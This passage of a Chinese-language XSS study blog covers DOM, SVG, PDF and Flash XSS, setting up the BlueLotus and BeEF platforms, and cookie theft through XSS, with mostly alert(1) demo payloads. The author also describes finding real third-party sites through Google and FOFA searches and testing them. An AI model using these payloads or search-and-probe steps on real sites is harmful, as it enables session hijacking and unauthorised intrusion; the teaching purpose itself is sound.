class=\"language-xml\">                location.<span class=\"property\">href</span> = url;  </span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">            &#125;  </span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">        </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span>  </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>假设有这样一个代码，正常访问是用 <code>#</code> 去实现页面跳转，但是因为跳转部分参数可控，可能导致 Dom xss。</p>\n</li>\n<li>\n<p>通过 location.hash 的方式，将参数写在 # 号后，既能让 JS 读取到该参数，又不让该参数传入到服务器，从而避免了 WAF 的检测。</p>\n</li>\n<li>\n<p>变量 hash 作为可控部分，并带入 url 中，变量 hash 控制的是#之后的部分，可以使用伪协议 <code>#javascript:alert(1)</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813162148934.png\" alt=\"image-20250813162148934\"></p>\n</li>\n<li>\n<p>可以看到通过改变客户端的传入参数即可造成 <code>xss</code>，服务器的检测是没有用的，这就是简单的 <code>DOM-XSS</code> 演示</p>\n</li>\n<li>\n<p>那么在实战中呢，也是存在的，我们可以通过 <code>edu.cn inurl:url=http</code> 语法去 <code>google</code> 上搜索一下，找到某某大学的一个网站（<code>gay</code> 迪上演示的站点）, 但这个洞已经两年了，还没有修复，侧面说明这玩意单独利用没什么危害</p>\n</li>\n<li>\n<p>发现这样的传参：<code>http://www.xxx.net/URL.html?url=http://xxx</code>，然后自动跳转对应的 URL</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813162535163.png\" alt=\"image-20250813162535163\"></p>\n</li>\n<li>\n<p>成功跳转，那就可能存在漏洞，尝试使用 <code>javascript:alert(1)</code> 弹窗：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250813162603026.png\" alt=\"image-20250813162603026\"></p>\n</li>\n<li>\n<p>成功弹出 <code>xss</code> 框，说明存在 <code>DOM-XSS</code> 漏洞</p>\n</li>\n</ul>\n<h4 id=\"二、扩展类型\">二、扩展类型</h4>\n<h5 id=\"1-SVG-XSS\">1.SVG-XSS</h5>\n<ul>\n<li>\n<p><code>SVG</code> 全称为 <code>Scalable Vector Graphics</code>（可缩放矢量图形），是一种基于 <code>XML</code> 格式的开放标准图像格式，用于描述二维矢量图形。与常见的位图（如 JPG、PNG、GIF 等）不同，SVG 不依赖像素点，而是 <strong>通过数学公式（如点、线、曲线、形状等几何元素）来定义图形</strong>。</p>\n</li>\n<li>\n<p>它的基本语法为：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">heigth</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!-- 这里放图片元素 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>其中 <code>xmlns=&quot;http://www.w3.org/2000/svg&quot;</code> 是必须声明的 <code>XML</code> 命名空间，告诉解析器这是 <code>SVG</code> 文档</p>\n</li>\n<li>\n<p><code>SVG</code> 也提供了多种预定义的图形元素，每个元素可以通过属性定义形状、颜色等样式，常见的有：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 矩形 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;60&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;blue&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;red&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;2&quot;</span> <span class=\"attr\">rx</span>=<span class=\"string\">&quot;5&quot;</span> <span class=\"attr\">ry</span>=<span class=\"string\">&quot;5&quot;</span>/&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 圆形 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;200&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;yellow&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;black&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;3&quot;</span>/&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 椭圆 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ellipse</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;150&quot;</span> <span class=\"attr\">rx</span>=<span class=\"string\">&quot;60&quot;</span> <span class=\"attr\">ry</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;green&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;purple&quot;</span>/&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 线段 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">line</span> <span class=\"attr\">x1</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">y1</span>=<span class=\"string\">&quot;200&quot;</span> <span class=\"attr\">x2</span>=<span class=\"string\">&quot;250&quot;</span> <span class=\"attr\">y2</span>=<span class=\"string\">&quot;200&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;orange&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;4&quot;</span> <span class=\"attr\">stroke-dasharray</span>=<span class=\"string\">&quot;5,3&quot;</span>/&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 多边形 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">&quot;150,250 100,350 200,350&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;pink&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;gray&quot;</span>/&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>具体可以参考：<a href=\"https://www.runoob.com/svg/svg-intro.html\">SVG 简介 | 菜鸟教程</a></p>\n</li>\n</ul>\n<h6 id=\"原理\">原理</h6>\n<ul>\n<li><code>SVG-XSS</code> 是指 <strong>利用 SVG 文件或代码注入进行的跨站脚本攻击</strong>。核心是通过在 <code>SVG</code> 内容中嵌入恶意的 JS 代码，当浏览器解析该 <code>SVG</code> 图片时，就会执行恶意代码，从而造成 <code>XSS</code> 攻击</li>\n<li>SVG 之所以能被用于 XSS 攻击，核心原因在于其 <strong>基于 XML 的特性允许嵌入脚本代码</strong>，且浏览器会将 SVG 作为 “可执行内容” 解析（而非单纯的静态图片）。</li>\n<li>一般这个是 <strong>配合文件上传一起使用</strong> 的</li>\n</ul>\n<h6 id=\"实战案例\">实战案例</h6>\n<ul>\n<li>\n<p>比如我们有这样一个 <code>SVG</code> 图片代码：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.1&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;black&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;2&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;red&quot;</span> /&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>然后我们本地搭建环境演示一下它能否弹出 <a href=\"https://so.csdn.net/so/search?q=%E5%AF%B9%E8%AF%9D%E6%A1%86&amp;spm=1001.2101.3001.7020\">对话框</a>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815213447794.png\" alt=\"image-20250815213447794\"></p>\n</li>\n<li>\n<p>可以看到直接访问这个地址，它就成功弹出了对话框，说明这段代码执行成功了</p>\n</li>\n<li>\n<p>那其实本地模拟成功就能够看到效果了，为了更加真实一点，我们就找一个文件上传的点，演示一下其配合 <a href=\"https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E&amp;spm=1001.2101.3001.7020\">文件上传漏洞</a> 的使用效果</p>\n</li>\n<li>\n<p>我们在网上随便找一个文件直链的地址，这里试了几个就这个能传：<a href=\"https://jiyiho.cn/driveweb/#upload\">JiYiHo 云盘网页版 - 免费在线文件外链生成</a></p>\n</li>\n<li>\n<p>然后上传我们的 <code>svg</code> 图片，等待他生成预览链接：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815213635264.png\" alt=\"image-20250815213635264\"></p>\n</li>\n<li>\n<p>然后我们就可以模拟攻击者将这个链接发给别人查看，一旦对方点击了这个链接，那就会执行我们的恶意代码：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815213656005.png\" alt=\"image-20250815213656005\"></p>\n</li>\n<li>\n<p>这就是关于 <code>SVG</code> 造成 <code>XSS</code> 配合文件上传的利用案例</p>\n</li>\n</ul>\n<h5 id=\"2-PDF-XSS\">2.PDF-XSS</h5>\n<h6 id=\"原理-2\">原理</h6>\n<ul>\n<li>\n<p>PDF 格式允许内嵌 <code>JavaScript</code> 代码，用于实现表单验证、动态内容更新等功能，攻击者可以利用此特性，在 PDF 中插入恶意代码，比如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.<span class=\"title function_\">alert</span>(<span class=\"string\">&quot;xss&quot;</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>同样，这个也是一般 <strong>配合文件上传利用</strong>，但是，很多都是不收的</p>\n</li>\n</ul>\n<h6 id=\"实战案例-2\">实战案例</h6>\n<ul>\n<li>\n<p>这里我们先创建一个 <code>pdf</code>，使用迅捷 PDF 编辑器，然后新建 -&gt; 视图 -&gt; 页面缩略图 -&gt; 右键 -&gt; 属性，然后找到动作打开页面这里，新增 <code>JavaScript</code> 代码：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815214729577.png\" alt=\"image-20250815214729577\"></p>\n</li>\n<li>\n<p>写入 <code>xss</code> 语句，然后保存到本地服务器，然后我们访问一下：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815214757377-1755265678383-1.png\" alt=\"\"></p>\n</li>\n<li>\n<p>成功弹窗，现在我们配合文件上传试一下，这里呢，我们就用 <a href=\"https://up.ly93.cc/\">涟漪文件直链</a>，因为刚刚那个传 PDF 只有下载链接，上传我们的 pdf：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815214836246.png\" alt=\"image-20250815214836246\"></p>\n</li>\n<li>\n<p>然后点击图标复制文件链接，访问：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815214901863.png\" alt=\"image-20250815214901863\"></p>\n</li>\n<li>\n<p>成功弹窗，那这个玩意就可以将链接发送给别人造成 <code>XSS</code> 漏洞，<strong>所以网上或者别人发你的链接不要随便乱点</strong></p>\n</li>\n</ul>\n<h5 id=\"3-Flash-XSS\">3.Flash-XSS</h5>\n<h6 id=\"原理-3\">原理</h6>\n<ul>\n<li>\n<p><code>Flash XSS</code> 指的是 <strong>利用 Adobe Flash（SWF 文件）的特性或漏洞，在用户浏览器中执行跨站脚本（XSS）攻击</strong> 的方式。它是历史上常见的 Web 安全威胁之一，其核心是通过恶意 Flash 内容（.swf 文件）注入或执行恶意脚本，从而窃取用户信息、劫持会话等。</p>\n</li>\n<li>\n<p>由于 <code>Flash</code> 在 2020 年彻底被 <code>Adobe</code> 弃用，并且现代浏览器默认禁用 <code>flash</code> 插件，所以这个漏洞基本是名存实亡了，因此这里就简单理解一下原理即可</p>\n</li>\n<li>\n<p>简单的恶意代码如下所示：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 取m参数</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> m = _root.<span class=\"property\">m</span>;</span><br><span class=\"line\"><span class=\"comment\">// 调用html中的JavaScript中的m参数值</span></span><br><span class=\"line\">flash.<span class=\"property\">external</span>.<span class=\"property\">ExternalInterface</span>.<span class=\"title function_\">call</span>(m);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>一般这个有两种利用方式：</p>\n<ul>\n<li>配合文件上传使用</li>\n<li>对本身的 <code>swf</code> 文件进行反编译逆向，分析触发点，触发 <code>XSS</code></li>\n</ul>\n</li>\n<li>\n<p>那么对于第二种利用方式如何进行测试呢？就分为以下几个步骤：</p>\n<ul>\n<li>反编译 <code>swf</code> 文件</li>\n<li>查找触发危险函数</li>\n<li>找可控参数访问触发</li>\n</ul>\n</li>\n<li>\n<p><strong><code>flash</code> 中常见可触发 <code>xss</code> 的危险函数有：<code>getURL</code>、<code>navigateToURL</code>、<code>ExternalInterface.call</code>、<code>htmlText</code>、<code>loadMovie</code> 等等</strong></p>\n</li>\n</ul>\n<h6 id=\"实战演示\">实战演示</h6>\n<ul>\n<li>\n<p>第一个上传演示就基本没必要演示了，和上面的两种 <code>XSS</code> 都差不多，有兴趣的可以自己复现一下</p>\n</li>\n<li>\n<p>我们这里就演示第二种利用方法，通过网站下载其 <code>.swf</code> 文件，然后逆向分析它存不存在 <code>JS</code> 注入点，尝试利用</p>\n</li>\n<li>\n<p>现在我们在 <code>fofa</code> 上搜索一下，语法：<code>&quot;phpwind&quot; &amp;&amp; icon_hash=&quot;-1005349246&quot;</code>，然后就随便找个网站测一下，在后面添加路径 <code>/images/uploader.swf</code> 看能不能下载：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815215327586.png\" alt=\"image-20250815215327586\"></p>\n</li>\n<li>\n<p>这里找到一个，然后下载下来利用 <code>FFDec</code> 工具打开：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815215353227.png\" alt=\"image-20250815215353227\"></p>\n</li>\n<li>\n<p>然后我们点击脚本就可以得到反编译的代码了，这个软件字体比较小，可以拖到 <code>VS code</code> 里面查看，一般就是找上面说的那些函数，其中最最常见的就是 <code>ExternalInterface.call</code></p>\n</li>\n<li>\n<p>这里就查找一下这个函数第一次出现的地方：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815215425375.png\" alt=\"image-20250815215425375\"></p>\n</li>\n<li>\n<p>现在开始审计代码，我们看到这个函数会接收一个可变参数 <code>jsobject</code>，然后找一下这个参数出现的位置，在上面可以看到它是从 URL 中接收的</p>\n</li>\n<li>\n<p>所以这种情况我们就可以尝试传入 <code>xss</code> 代码，注意啊，这里 <strong>要换成火狐渗透浏览器他才会正确弹窗</strong>，原因暂时未知：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250815215923454.png\" alt=\"image-20250815215923454\"></p>\n</li>\n<li>\n<p>那如果它这里的参数是固定死的，或者加了过滤，可能就不适用了</p>\n</li>\n<li>\n<p>这个就是 <code>Flash XSS</code> 的两种利用方式，按照 <code>gay</code> 迪的说法是用处不大，但了解一点还是好的</p>\n</li>\n</ul>\n<h5 id=\"4-mXSS\">4.mXSS</h5>\n<ul>\n<li><code>mXSS</code> 即 <code>Mutation XSS</code>（突变型跨站脚本），其恶意代码在 <strong>初始输入和输出阶段可能被过滤或编码为 “无害内容”</strong>，但在后续的 <strong>DOM 操作（突变）过程中</strong>，由于浏览器解析规则或页面脚本的处理，这些 “无害内容” 会被重新转换为可执行的恶意脚本，最终触发 XSS 攻击。</li>\n<li>简单点来说就是由于解析策略的不同导致了，一个做了处理认为没危害，一个又做了另一种处理导致又有危害了，正正得负吧可能是</li>\n<li>但是这个漏洞不常见了，所以也没办法演示，这里就结合这篇文章看看吧：<a href=\"https://www.fooying.com/the-art-of-xss-1-introduction/\">跨站的艺术-XSS 入门与介绍  Fooying </a></li>\n</ul>\n<h5 id=\"5-uXSS\">5.uXSS</h5>\n<ul>\n<li><code>uXSS</code> 即 <code>Universal XSS</code>（通用型跨站脚本），是一种 <strong>利用浏览器或者其插件</strong> 的漏洞，而非目标网站本身的缺陷，从而突破同源策略限制、实现跨域攻击的高级 XSS 类型。</li>\n<li>现在也是比较少碰到了，参考文章：<a href=\"https://www.fooying.com/uxss/\">通用跨站脚本攻击(UXSS) Fooying </a></li>\n</ul>\n<h4 id=\"三、XSS-平台搭建\">三、XSS 平台搭建</h4>\n<h5 id=\"1-BlueLotus-XSS\">1.BlueLotus_XSS</h5>\n<ul>\n<li>直接利用小皮搭建就行，记住不要开 js 相关的插件，不然会显示登录密码错误</li>\n</ul>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826134659840.png\" alt=\"image-20250826134659840\"></p>\n<h5 id=\"2-Beef\">2.Beef</h5>\n<ul>\n<li>\n<p>kali 好像是自带的，这里用 docker 演示</p>\n</li>\n<li>\n<p>首先执行下面这两条命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">docker pull beefproject/beef</span></span><br><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">docker run --<span class=\"built_in\">rm</span> -p 3000:3000 beefproject/beef</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>如果这里执行第二条命令报错</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826135149937.png\" alt=\"image-20250826135149937\"></p>\n</li>\n<li>\n<p>就执行以下命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">启动容器并进入shell窗口</span></span><br><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">docker run -it --<span class=\"built_in\">rm</span> -p 3000:3000 --entrypoint /bin/bash beefproject/beef</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>进入容器内，然后找到 <code>config.yaml</code> 文件，一般文件位置为：<code>/beef/config.yaml</code></p>\n</li>\n<li>\n<p>然后不要关闭这个容器，新建一个 <code>shell</code> 窗口，运行以下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将容器中的config.yaml复制到本地</span></span><br><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">docker <span class=\"built_in\">cp</span> temp-beef:/beef/config.yaml ./beef-config.yaml</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里路径根据自己容器内的路径更改，但应该都是一样的</p>\n</li>\n<li>\n<p>然后 <code>vim beef.config.yaml</code>（没有 <code>vim</code> 就用 <code>nano</code> 或者 <code>vi</code>），找到账号密码这个位置，把密码改一下：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826135932705.png\" alt=\"image-20250826135932705\"></p>\n</li>\n<li>\n<p>然后每次启动时运行如下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">docker run --<span class=\"built_in\">rm</span> -p 3000:3000 -v $(<span class=\"built_in\">pwd</span>)/beef-config.yaml:/beef/config.yaml beefproject/beef</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826140200545.png\" alt=\"image-20250826140200545\"></p>\n</li>\n<li>\n<p>最后访问 <code>http://localhost:3000/ui/panel</code>，登录即可使用：</p>\n</li>\n</ul>\n<h4 id=\"四、XSS-盲打\">四、XSS 盲打</h4>\n<ul>\n<li>只要看见满足两个条件的地方就可以直接插入 xss 语句查看结果\n<ul>\n<li>有数据输入，且可控</li>\n<li>有数据回显在前端</li>\n</ul>\n</li>\n<li>黑盒测试的一种方法</li>\n</ul>\n<h4 id=\"五、Cookie-盗取\">五、Cookie 盗取</h4>\n<p><strong>原理</strong></p>\n<ul>\n<li>安全开发讲过基于 <code>Cookie</code> 的身份验证，基本逻辑就是 <strong>如果你登录之后浏览器会生成并保存一个 <code>Cookie</code> 值，然后当你下一次访问这个网站的时候浏览器就直接将 <code>Cookie</code> 发给服务器进行身份验证，避免重复登录</strong></li>\n<li>那现在我们通过 <code>XSS</code> 攻击语句是可以盗取这个 <code>Cookie</code> 的，所以一旦拿到这个之后，我们就可以伪造用户进行登录，这就是 <code>XSS</code> 最常用的攻击手段——<code>Cookie</code> 盗取</li>\n</ul>\n<p><strong>利用条件</strong></p>\n<ul>\n<li><strong>目标网站存在可利用的 XSS 漏洞</strong>：攻击者需能在目标页面中注入并执行恶意 JavaScript 代码。漏洞类型可以是存储型 XSS（恶意脚本被永久存储在服务器，如评论区、个人资料）或反射型 XSS（恶意脚本通过 URL 参数等临时触发，需诱导受害者点击）。</li>\n<li><strong>目标 Cookie 未设置有效的保护属性</strong>：\n<ul>\n<li>网站只利用 <code>Cookie</code> 进行身份验证，没有用到什么 <code>token</code> 之类的东西辅助验证</li>\n<li>并且 <code>Cookie</code> 和浏览器也没有设置像 <code>HttpOnly=true</code>、<code>SameSite</code>、<code>Secure</code> 的属性</li>\n</ul>\n</li>\n<li><strong>受害者需要触发恶意脚本并且 Cookie 有效</strong>：受害者需访问包含恶意脚本的页面（存储型 XSS）或点击含恶意代码的 URL（反射型 XSS），且此时受害者浏览器中存在有效的目标 Cookie（如处于登录状态）。</li>\n</ul>\n<h5 id=\"案例一、小皮面板\">案例一、小皮面板</h5>\n<ul>\n<li>\n<p>首先我们需要利用自己搭建的 xss 平台，这里选择的是蓝莲花，来到“我的 JS”按照如下图新建一个 js 代码</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826193715182.png\" alt=\"image-20250826193715182\"></p>\n</li>\n<li>\n<p>点击生成 <code>payload</code>，然后在小皮的登录页面中插入这个 <code>xss</code> 语句，注意多插几次</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826193741676.png\" alt=\"image-20250826193741676\"></p>\n</li>\n<li>\n<p>然后我们模拟管理员登录小皮后台，查看日志</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826193824524.png\" alt=\"image-20250826193824524\"></p>\n</li>\n<li>\n<p>这时刚刚的 <code>xss</code> 平台应该就有消息了提醒了：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826193848390.png\" alt=\"image-20250826193848390\"></p>\n</li>\n<li>\n<p>拿到这个 <code>Cookie</code> 信息之后，我们尝试去进行未授权登录：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826194100452.png\" alt=\"image-20250826194100452\"></p>\n</li>\n<li>\n<p>当然这里抓包更直观一些，刷新页面之后，你会发现并没有进入后台，因为这个网站除了 <code>Cookie</code> 还会加载这个文件：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826194125183.png\" alt=\"image-20250826194125183\"></p>\n</li>\n<li>\n<p>这里由于管理员登录之后会有一个 <code>access_token</code> 对其进行身份验证，所以我们只用 <code>Cookie</code> 是不行的</p>\n</li>\n</ul>\n<h5 id=\"案例二、贷款-APP\">案例二、贷款 APP</h5>\n<ul>\n<li>\n<p>这里演示的是一个本地搭建的贷款 APP，需要用到旧版的 <code>phpstudy_pro</code> 搭建，但我的证书好像有问题，必须得配合 bp 的证书才能实现后续操作</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826194725660.png\" alt=\"image-20250826194725660\"></p>\n</li>\n<li>\n<p>我们用一个浏览器模拟管理员，然后一个浏览器模拟攻击者，这里我们先登录后台：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826194750625.png\" alt=\"image-20250826194750625\"></p>\n</li>\n<li>\n<p>然后再登录上面的个人中心：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826194820119.png\" alt=\"image-20250826194820119\"></p>\n</li>\n<li>\n<p>我们点击右上角的齿轮，并在上面插入我们的 <code>js</code> 语句，因为像这种贷款，肯定有一个后台能看到我们的账号，去处理我们的贷款，所以合理猜测这里是有日志记录的，既然有日志记录，那我们就可以利用 xss</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826195120304-1756209081151-1.png\" alt=\"image-20250826195120304\"></p>\n</li>\n<li>\n<p>然后返回点击提现，这里点击申请结算</p>\n</li>\n<li>\n<p>然后我们转入管理员视角，查看日志，成功弹窗</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826195224421.png\" alt=\"image-20250826195224421\"></p>\n</li>\n<li>\n<p>当然这只是测试，实战我们就会插入我们 <code>xss平台</code> 的 <code>js</code> 语句，然后盗取 <code>cookie</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826195453943.png\" alt=\"image-20250826195453943\"></p>\n</li>\n<li>\n<p>之后我们将攻击者浏览器的 <code>cookie</code> 一换，即可实现登录后台</p>\n</li>\n</ul>\n<h4 